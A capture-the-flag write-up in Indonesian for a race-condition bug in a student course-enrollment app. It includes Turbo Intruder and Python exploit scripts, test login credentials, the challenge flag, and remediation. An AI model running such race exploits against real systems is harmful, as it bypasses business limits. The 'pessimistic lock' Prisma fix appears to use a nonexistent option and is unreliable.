# WRITEUP: SIAK Next Gen - Race Condition CTF Challenge

## Challenge Objective

Mendapatkan flag dengan mengeksploitasi race condition untuk mendaftar pada mata kuliah rahasia **CSCTF999 - Seminar Khusus Keamanan Nasional** yang memiliki bobot 24 SKS dan tidak dapat didaftarkan secara normal.

---

## Vulnerability Explanation

### Root Cause

Endpoint `POST /api/irs/add` memiliki **Time-of-Check Time-of-Use (TOCTOU)** vulnerability. Backend melakukan pengecekan batas SKS sebelum insert data, namun operasi ini **tidak atomic** dan **tidak menggunakan locking**.

### Kode Vulnerable (src/app/api/irs/add/route.ts)

```typescript
// 1. Baca current SKS (tanpa lock)
const currentEnrollments = await prisma.enrollment.findMany({
  where: { userId: user.id, status: "ENROLLED" },
  include: { course: true },
});
const currentSKS = currentEnrollments.reduce((sum, e) => sum + e.course.credits, 0);

// 2. Validasi batas (tanpa transaksi)
if (currentSKS + course.credits > maxSKS) {
  return NextResponse.json({ error: "SKS limit exceeded" }, { status: 400 });
}

// 3. Insert (terpisah dari validasi)
await prisma.enrollment.create({
  data: { userId: user.id, courseId, status: "ENROLLED" },
});
```

### Masalah

Antara langkah 1-2 dan langkah 3, **request lain yang berjalan secara paralel** juga membaca nilai `currentSKS` yang **sama** (belum berubah karena insert belum terjadi). Akibatnya, multiple request bisa lolos validasi dan melakukan insert, sehingga total SKS akhir melebihi batas maksimal.

### Contoh Skenario

```
State awal: currentSKS = 18, maxSKS = 24

Request A (MK002 - 4 SKS):  baca currentSKS = 18,  18+4=22 ≤ 24 ✓ → insert
Request B (MK006 - 3 SKS):  baca currentSKS = 18,  18+3=21 ≤ 24 ✓ → insert

State akhir: 18 + 4 + 3 = 25 SKS (MELEBIHI BATAS!)
```

---

## Challenge Design

### Dua Mekanisme Pertahanan

1. **SKS Check Normal** — Setiap penambahan mata kuliah biasa dicek terhadap batas SKS. Jika `currentSKS + credits > maxSKS`, request ditolak. Rentan terhadap race condition.

2. **Hidden Course Guard** — CSCTF999 memiliki bobot **24 SKS** dan hanya dapat didaftarkan jika flag `hasOverloaded` pada user bernilai `true`. Flag ini hanya akan aktif jika sistem mendeteksi SKS melebihi batas maksimal (hanya mungkin melalui race condition).

### State Awal Mahasiswa

| Item | Nilai |
|------|-------|
| SKS saat ini | 18 (MK001 3 + MK003 3 + MK004 3 + MK005 3 + MK000 6) |
| Maksimal SKS | 24 (IP 3.78 >= 3.5) |
| Sisa kuota | 6 SKS |
| CSCTF999 | 24 SKS — tidak muat! |
| MK000 (dummy) | 6 SKS — dapat di-drop |

---

## Exact Exploitation Steps

### Step 1: Login

Login sebagai mahasiswa:

- **Email:** mahasiswa@student.ui.ac.id
- **Password:** password123

### Step 2: Kirim Parallel Requests

Kirim 2+ request `POST /api/irs/add` secara **bersamaan** untuk menambahkan minimal 2 mata kuliah biasa.

**Target Courses (contoh):**
- MK002 - Algoritma dan Pemrograman (4 SKS)
- MK006 - Sistem Operasi (3 SKS)

Kedua request akan membaca `currentSKS = 18`, keduanya lolos validasi, dan keduanya melakukan insert. Hasil akhir: SKS menjadi 18 + 4 + 3 = **25 SKS** (OVER LIMIT).

### Step 3: Overload Terdeteksi

Sistem mendeteksi bahwa SKS melebihi batas dan mengaktifkan flag `hasOverloaded = true` pada user.

### Step 4: Daftar CSCTF999

Kirim request `POST /api/irs/add` dengan `courseId` CSCTF999. Karena `hasOverloaded = true`, sistem mengizinkan pendaftaran tanpa pengecekan SKS.

```
SKS setelah race: 25/24
CSCTF999 (24 SKS): check hasOverloaded → true → SKIP SKS check → enrolled!
SKS setelah CSCTF999: 49/24
```

### Step 5: Akses Hidden Course

Buka halaman detail CSCTF999 di `/courses/{course-id}`.

Flag akan ditampilkan jika:
1. User terdaftar di CSCTF999 ✓
2. User memiliki `hasOverloaded = true` ✓

---

## Burp Suite Instructions

### 1. Login dan Capture Request

1. Buka Burp Suite
2. Login ke aplikasi melalui browser dengan proxy Burp
3. Temukan request dan kirim ke Repeater

### 2. Kirim Parallel Requests

1. Intercept request POST `/api/irs/add` dengan body `{"courseId": "<course-id-mk002>"}`
2. Kirim ke Repeater (Tab 1)
3. Buat Tab 2 dengan body `{"courseId": "<course-id-mk006>"}`
4. Klik kanan pada Tab 1 → **Send Group in Parallel** (pilih kedua tab)

Pastikan kedua request dikirim dalam satu grup paralel.

### 3. Daftar CSCTF999

1. Di Tab 3, buat request POST `/api/irs/add` dengan body `{"courseId": "<course-id-csctf999>"}`
2. Kirim secara normal (sequential, karena hanya 1 request)
3. Response: `"Berhasil menambahkan CSCTF999"`

### 4. Ambil Flag

GET `/api/courses/{course-id-csctf999}` → Flag akan muncul di response.

---

## Turbo Intruder Example

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           requestsPerConnection=1,
                           pipeline=False)

    # Tahap 1: Kirim 2 request secara paralel
    requests = [
        '{"courseId": "<MK002-course-id>"}',
        '{"courseId": "<MK006-course-id>"}',
    ]

    for body in requests:
        engine.queue(target.req, body)

    # Tahap 2: Daftar CSCTF999
    engine.queue(target.req, '{"courseId": "<CSCTF999-course-id>"}')

def handleResponse(req, interesting):
    if 'success' in req.response:
        table.add(req)
```

## Python Script (Alternative)

```python
import asyncio
import aiohttp

BASE = "http://localhost:3000"
TOKEN = "<your-jwt-token>"

async def add_course(session, course_id):
    async with session.post(
        f"{BASE}/api/irs/add",
        json={"courseId": course_id}
    ) as resp:
        return await resp.json()

async def exploit():
    async with aiohttp.ClientSession(cookies={"token": TOKEN}) as session:
        # Tahap 1: Race condition
        results = await asyncio.gather(
            add_course(session, "<MK002-id>"),
            add_course(session, "<MK006-id>"),
        )
        success = sum(1 for r in results if r.get("success"))
        print(f"Tahap 1: {success}/2 berhasil")

        # Tahap 2: Daftar CSCTF999
        r = await add_course(session, "<CSCTF999-id>")
        print(f"CSCTF999: {r.get('message', 'gagal')}")

asyncio.run(exploit())
```

---

## Root Cause Analysis

### Prisma ORM Issues

Prisma ORM secara default tidak menggunakan transaksi untuk operasi terpisah. Setiap query adalah operasi individual:

```typescript
// Tanpa transaksi - VULNERABLE
const currentSKS = await getCurrentSKS(user.id);
// Gap: request lain bisa mengubah data di sini
if (currentSKS + course.credits > maxSKS) { /* check */ }
// Gap: request lain bisa mengubah data di sini
await createEnrollment(user.id, courseId);
```

### Recommended Fix

```typescript
// Dengan transaksi + locking - FIXED
await prisma.$transaction(async (tx) => {
  const enrollments = await tx.enrollment.findMany({
    where: { userId: user.id, status: "ENROLLED" },
    include: { course: true },
    lock: { mode: "pessimistic" },
  });

  const currentSKS = enrollments.reduce((sum, e) => sum + e.course.credits, 0);

  if (currentSKS + course.credits > maxSKS) {
    throw new Error("SKS limit exceeded");
  }

  await tx.enrollment.create({
    data: { userId: user.id, courseId, status: "ENROLLED" },
  });
});
```

---

## Why Two-Step Exploit is Required

| Langkah | Deskripsi | Hasil |
|---------|-----------|-------|
| Direct add CSCTF999 | Gagal karena 24 > 6 (sisa kuota) | Ditolak sistem |
| Race 2 courses | Concurrent requests bypass SKS check | SKS overload (25/24) |
| `hasOverloaded = true` | Sistem mendeteksi overload | Flag aktif |
| Add CSCTF999 | Check hasOverloaded → skip SKS check | Berhasil daftar |
| Akses detail course | Enrolled + hasOverloaded | **FLAG TAMPAK** |

---

## Remediation Guidance

### 1. Gunakan Database Transactions

Bungkus operasi read-check-write dalam satu transaksi database.

### 2. Implement Pessimistic Locking

Gunakan `SELECT ... FOR UPDATE` untuk mengunci baris yang dibaca.

### 3. Validasi Hidden Course dengan Atomic Check

Hidden course guard juga harus dalam transaksi yang sama dengan SKS check.

### 4. Defense in Depth

- Validasi frontend (UX)
- Validasi backend dengan locking
- Audit log untuk mendeteksi anomali
- Rate limiting pada endpoint kritis
- Jangan izinkan pendaftaran berdasarkan state khusus (hasOverloaded) yang bisa diset via race condition

---

## Flag

```
CTF{race_condition_in_academic_workflow}
```
